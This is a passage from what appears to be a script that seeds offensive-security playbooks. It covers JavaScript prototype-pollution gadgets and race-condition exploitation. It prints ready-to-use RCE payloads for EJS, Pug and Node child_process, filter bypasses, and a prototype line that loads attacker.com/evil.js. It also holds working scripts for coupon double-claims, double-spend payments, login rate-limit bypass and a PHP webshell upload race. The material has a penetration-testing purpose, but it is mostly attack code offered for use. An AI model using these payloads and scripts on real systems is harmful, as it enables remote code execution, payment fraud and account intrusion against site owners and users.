_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---

## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---

## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---

## 5. EXPLOITATION FLOW

```
1. Find merge sink (prototype-pollution-test.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---

## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to prototype-pollution-test.md for detection
```

---

## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```


---


## 附件：KNOWN_GADGETS

# Prototype Pollution — Known Gadgets Reference


## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |

---

## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---

## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---

## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---

## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---

## 6. WEBPACK

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `output.library` | Modified library name | Build process | Code injection in output | Webpack 4.x–5.x |
| `output.auxiliaryComment` | Code injection via comment | Build process | XSS in built files | Webpack 4.x |
| `devtool` | `"eval"` → enables eval mode | Build process | Code execution path | Webpack 4.x–5.x |

Webpack PP is exploitable during **build time**, not runtime. Useful in CI/CD attack chains.

---

## 7. FASTIFY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `reply.view` options | Template engine options (same as EJS/Pug gadgets) | `reply.view()` | RCE | Fastify + point-of-view |
| `rewriteUrl` | URL rewrite function | Request routing | Access control bypass | Fastify 3.x |
| `schema` | Modified validation schema | Route validation | Validation bypass | Fastify 3.x–4.x |

---

## 8. NODE.JS CORE

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `shell` | `"node"` or `"/bin/sh"` | `child_process.spawn()` without explicit shell | RCE | All Node.js |
| `NODE_OPTIONS` | `"--require /path/to/evil.js"` | `child_process.fork()` / `.spawn()` | RCE | Node.js 8+ |
| `argv0` | Malicious argument | `child_process.spawn()` | Code injection | All |
| `env` | Custom environment variables | `child_process.spawn()` without explicit env | ENV injection | All |
| `input` | Stdin data | `child_process.execSync()` | Data injection | All |
| `stdio` | Modified stdio config | `child_process.spawn()` | File descriptor manipulation | All |

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
```

---

## 9. MISCELLANEOUS LIBRARIES

### minimist (Argument Parser)

```bash
# CLI argument pollution:
node app.js --__proto__.polluted yes
# Pollutes Object.prototype.polluted = "yes"
```

Affected: minimist < 1.2.6

### yargs

Similar to minimist — CLI argument parsing can pollute prototype.

### qs (Query String Parser)

```
# URL query pollution:
?__proto__[polluted]=yes
?__proto__.polluted=yes
```

qs versions < 6.0.4 allow prototype pollution via nested brackets.

### destr (JSON Parser)

```javascript
destr('{"__proto__":{"polluted":"yes"}}')
// Older versions allow PP through JSON parsing
```

### json5

```javascript
JSON5.parse('{"__proto__":{"polluted":"yes"}}')
// Older versions may pollute prototype
```

---

## 10. GADGET SELECTION FLOWCHART

```
Identified target stack?
│
├── Server-side Node.js
│   ├── Express + template engine?
│   │   ├── EJS → outputFunctionName (highest success rate)
│   │   ├── Pug → block.type + block.val
│   │   ├── Handlebars → allowProtoMethodsByDefault + template chain
│   │   ├── Nunjucks → type: Code
│   │   └── Unknown → try EJS gadget first (most common)
│   │
│   ├── Fastify + point-of-view?
│   │   └── Same template gadgets apply via reply.view
│   │
│   ├── child_process used? (likely yes in any Node.js app)
│   │   └── shell + NODE_OPTIONS → universal Node.js RCE
│   │
│   └── No template / no child_process?
│       └── Try status/header pollution for impact demonstration
│
├── Client-side JavaScript
│   ├── jQuery?
│   │   └── $.extend(true,...) sink + innerHTML/src gadget
│   │
│   ├── Lodash?
│   │   └── _.merge/defaultsDeep sink + _.template sourceURL gadget
│   │
│   ├── Angular 1.x?
│   │   └── $interpolate + sandbox bypass
│   │
│   ├── Vue 2.x?
│   │   └── template property pollution
│   │
│   └── None of the above?
│       └── Generic DOM property pollution (src, href, innerHTML)
│
└── Build pipeline (CI/CD)
    └── Webpack output.library / devtool pollution
```
TECH_PROTOTYPE_POLLUTION_TEST_EOF

seed_rule techniques/race-condition-test.md <<'TECH_RACE_CONDITION_TEST_EOF'
> 结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。验证码并发只为打通登录/改密才报；纯短信轰炸不写。

## 一、原有知识库

# 竞态条件测试手册

## 一、竞态条件原理

### TOCTOU (Time-of-Check to Time-of-Use)

```
正常流程:
1. 检查条件（如余额是否充足）
2. 执行操作（扣款）

竞态条件:
线程A: 检查余额100 → 扣款50
线程B: 检查余额100 → 扣款50
结果: 余额应为0，实际可能为50或-50
```

对象存储配了「不存在则回源」、检测和真正下载拆开时：对同一 key 边 PUT 边 DELETE，可绕过「先看对象在不在」。见 `ssrf-test.md`「COS 回源竞态」。**见了回源再打**，不是每站必打。

---

## 二、高危场景识别

### 2.1 优惠券/红包领取

```python
# 一次性资源重复获取
# 场景: 优惠券限领1次，但并发请求可领多次

import requests
import threading

url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

def claim():
    r = requests.post(url, headers=headers, json=data)
    print(r.json())

# 并发50次
threads = [threading.Thread(target=claim) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查账户是否领到多张优惠券
```

### 2.2 余额/积分消费（双花攻击）

```python
# 场景: 余额100，同时发起2笔100的消费

import asyncio
import aiohttp

async def consume(session):
    async with session.post(
        "https://target.com/api/pay",
        headers={"Authorization": "Bearer TOKEN"},
        json={"amount": 100}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [consume(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())

# 检查: 是否成功消费超过余额的金额
```

### 2.3 投票/点赞（重复计数）

```bash
# 场景: 每人限投1票，但并发可投多票

for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"targetId": "123"}' &
done
wait

# 检查目标的票数是否增加超过1
```

### 2.4 文件上传后删除

```python
# 场景: 上传 webshell → 系统检测到恶意 → 删除
# 利用: 上传后立即并发访问，在删除前执行

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("成功执行:", r.text)
            break

# 线程1上传，线程2疯狂访问
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### 2.5 限量抢购（库存超卖）

```python
# 场景: 商品库存10，但100人同时下单

import requests
import threading

def buy():
    r = requests.post("https://target.com/api/order/create",
        headers={"Authorization": "Bearer TOKEN"},
        json={"goodsId": "LIMITED_ITEM", "count": 1})
    print(r.json())

threads = [threading.Thread(target=buy) for _ in range(100)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查: 是否有超过10个订单成功
```

### 2.6 验证码验证

```python
# 场景: 验证码验证后失效，但并发提交可绕过

import requests
import threading

code = "123456"  # 获取到的验证码

def submit():
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": code})
    print(r.json())

# 并发提交同一验证码
threads = [threading.Thread(target=submit) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## 三、测试工具与方法

### 3.1 HTTP/2 单包攻击（Single Packet Attack）

**原理**: HTTP/2 多路复用允许在一个 TCP 包内发送多个请求，消除网络抖动，所有请求几乎同时到达服务器。

#### h2load 用法

```bash
# 安装 h2load (nghttp2)
# Ubuntu: apt install nghttp2-client
# macOS: brew install nghttp2

# 发送50个并发请求，使用1个连接，每个连接最多50个流
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"couponId":"NEWUSER100"}' \
  -H "Content-Type: application/json" \
  https://target.com/api/coupon/claim

# 参数说明:
# -n: 总请求数
# -c: 并发连接数（设为1确保单包）
# -m: 每个连接的最大并发流数
# -d: POST 数据
# -H: 请求头
```

#### Python httpx 实现

```python
import httpx
import asyncio

async def single_packet_attack():
    """HTTP/2 单包攻击"""
    url = "https://target.com/api/coupon/claim"
    headers = {
        "Authorization": "Bearer TOKEN",
        "Content-Type": "application/json"
    }
    data = {"couponId": "NEWUSER100"}
    
    # 使用 HTTP/2
    async with httpx.AsyncClient(http2=True) as client:
        # 在同一连接上并发发送请求
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        
        for i, resp in enumerate(responses):
            print(f"请求 {i+1}: {resp.status_code} - {resp.text}")

asyncio.run(single_packet_attack())
```

### 3.2 Turbo Intruder（Burp 插件）

```python
# Burp → Extender → BApp Store → Turbo Intruder

# 脚本示例（在 Turbo Intruder 中使用）
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req)
    
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Python asyncio + aiohttp

```python
import asyncio
import aiohttp
import time

async def race_condition_test(url, headers, data, count=50):
    """通用竞态条件测试"""
    
    async def send_request(session, index):
        start = time.time()
        async with session.post(url, headers=headers, json=data) as resp:
            elapsed = time.time() - start
            result = await resp.json()
            return {
                "index": index,
                "status": resp.status,
                "elapsed": elapsed,
                "result": result
            }
    
    # 创建连接池，复用连接
    connector = aiohttp.TCPConnector(limit=1, limit_per_host=1)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 预热连接
        await session.post(url, headers=headers, json=data)
        
        # 并发发送
        tasks = [send_request(session, i) for i in range(count)]
        results = await asyncio.gather(*tasks)
        
        return results

# 使用示例
url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

results = asyncio.run(race_condition_test(url, headers, data, 50))

# 分析结果
success_count = sum(1 for r in results if r['status'] == 200)
print(f"成功请求数: {success_count}/50")

# 检查响应时间分布（越接近说明并发度越高）
times = [r['elapsed'] for r in results]
print(f"最快: {min(times):.3f}s, 最慢: {max(times):.3f}s, 平均: {sum(times)/len(times):.3f}s")
```

### 3.4 curl 并发

```bash
# 简单并发（网络抖动较大，效果较差）
for i in $(seq 1 50); do
  curl -X POST "https://target.com/api/coupon/claim" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"couponId":"NEWUSER100"}' &
done
wait

# 使用 GNU Parallel（更好的并发控制）
seq 1 50 | parallel -j 50 \
  'curl -X POST "https://target.com/api/coupon/claim" \
   -H "Authorization: Bearer TOKEN" \
   -H "Content-Type: application/json" \
   -d "{\"couponId\":\"NEWUSER100\"}"'
```

---

## 四、判断标准

### 如何确认竞态条件成功

#### 4.1 余额/积分变化

```python
# 测试前记录余额
before = get_balance()

# 执行竞态测试
race_condition_test(...)

# 测试后检查余额
after = get_balance()

# 判断
if before - after > expected_deduction:
    print("竞态条件成功: 扣款异常")
```

#### 4.2 重复记录

```sql
-- 检查数据库是否有重复记录
SELECT coupon_id, user_id, COUNT(*) as count
FROM user_coupons
WHERE user_id = 'TEST_USER'
GROUP BY coupon_id, user_id
HAVING count > 1;
```

#### 4.3 库存异常

```python
# 检查订单数是否超过库存
orders = get_orders(goods_id="LIMITED_ITEM")
stock = get_stock(goods_id="LIMITED_ITEM")

if len(orders) > stock:
    print(f"库存超卖: 库存{stock}，订单{len(orders)}")
```

#### 4.4 响应内容分析

```python
# 分析所有响应
results = race_condition_test(...)

success_responses = [r for r in results if r['status'] == 200]
print(f"成功响应数: {len(success_responses)}")

# 检查响应中的业务状态码
business_success = [r for r in success_responses 
                   if r['result'].get('code') == 0]
print(f"业务成功数: {len(business_success)}")

# 如果业务成功数 > 1（对于一次性资源）→ 竞态条件存在
```

---

## 五、WooYun 实战模式

### 5.1 支付场景

```python
# 案例: 余额100，同时发起2笔100的支付
# 期望: 第二笔失败
# 实际: 两笔都成功，余额变为-100

async def double_spend_attack():
    url = "https://target.com/api/pay"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {"orderId": "ORDER123", "amount": 100}
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, headers=headers, json=data),
            session.post(url, headers=headers, json=data)
        ]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

### 5.2 优惠券场景

```python
# 案例: 同一优惠券并发使用多次
# 期望: 只能使用1次
# 实际: 使用了10次

async def coupon_reuse_attack():
    url = "https://target.com/api/order/create"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {
        "goodsId": "ITEM123",
        "couponId": "DISCOUNT50"  # 50元优惠券
    }
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, json=data) 
                for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.status == 200)
        print(f"成功使用优惠券 {success} 次")
```

### 5.3 签到/积分场景

```python
# 案例: 并发签到获得多倍积分
# 期望: 每日签到1次，获得10积分
# 实际: 并发签到20次，获得200积分

async def checkin_race():
    url = "https://target.com/api/checkin"
    headers = {"Authorization": "Bearer TOKEN"}
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

---

## 六、高级技巧

### 6.1 延迟释放（Delay Release）

```python
# 在检查和执行之间插入延迟，增加竞态窗口

# 服务端伪代码:
# balance = get_balance(user_id)
# if balance >= amount:
#     time.sleep(0.1)  # 人为延迟
#     deduct_balance(user_id, amount)

# 攻击: 在这0.1秒内发送多个请求
```

### 6.2 连接复用

```python
# 复用 TCP 连接，减少握手时间，提高并发度

import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
session.mount('https://', adapter)

# 所有请求使用同一连接
for _ in range(50):
    session.post(url, headers=headers, json=data)
```

### 6.3 时间窗口探测

```python
# 先探测操作耗时，找到最佳攻击窗口

import time

def measure_timing():
    times = []
    for _ in range(10):
        start = time.time()
        requests.post(url, headers=headers, json=data)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_time = sum(times) / len(times)
    print(f"平均响应时间: {avg_time:.3f}s")
    
    # 如果响应时间 > 100ms，竞态窗口较大
    return avg_time

# 根据响应时间调整并发数
avg_time = measure_timing()
if avg_time > 0.1:
    concurrent_count = 100  # 窗口大，增加并发
else:
    concurrent_count = 20   # 窗口小，减少并发
```

---

## 七、防护检测

```python
# 检测是否有竞态保护

# 1. 数据库锁（悲观锁）
# 特征: 并发请求时，后续请求等待前一个完成
# 检测: 观察响应时间是否呈阶梯状增长

# 2. 乐观锁（版本号）
# 特征: 并发请求时，只有一个成功，其他返回"版本冲突"
# 检测: 观察失败响应的错误信息

# 3. 分布式锁（Redis）
# 特征: 类似数据库锁
# 检测: 响应时间分析

# 4. 幂等性设计
# 特征: 重复请求返回相同结果，不产生副作用
# 检测: 多次发送相同请求，观察结果是否一致
```

---

## 九、注意事项

1. **测试范围**: 只在自己的测试账号上测试，不要影响其他用户
2. **测试强度**: 并发数不要过大（建议 ≤ 50），避免 DoS
3. **数据恢复**: 测试后检查账户状态，如有异常及时报告
4. **PoC 证据**: 保存测试前后的余额/积分截图，以及所有请求响应

---

## 二、补充：race-condition

### race-condition

### Race Conditions — Testing & Exploitation Playbook


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
